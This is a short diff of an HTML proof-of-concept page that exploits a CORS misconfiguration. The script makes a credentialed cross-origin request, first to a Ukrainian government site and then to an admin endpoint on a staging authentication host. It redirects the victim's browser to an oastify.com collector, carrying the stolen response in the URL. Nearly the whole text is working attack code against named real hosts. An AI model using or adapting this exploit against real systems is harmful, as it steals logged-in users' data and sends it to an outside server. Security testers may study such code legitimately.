@@ -5,12 +5,12 @@
 // Victim visits this page while logged into target.com
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('get', 'https://ehealth.gov.ua/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fehealth.gov.ua%2F', true);
+req.open('get', 'https://auth.stage.nadija.pp.ua/resources/master/admin/en', true);
 req.withCredentials = true;
 req.send('{}');
 
 function reqListener() {
-  location='//1prsg7bp04az0ry1i2isc1htmksbg44t.oastify.com/log?key='+this.responseText;
+  location='https://h9rrq24sty9w5wusmot2qexam1ssgm4b.oastify.com/log?key='+this.responseText;
 };
 </script>
 </body>
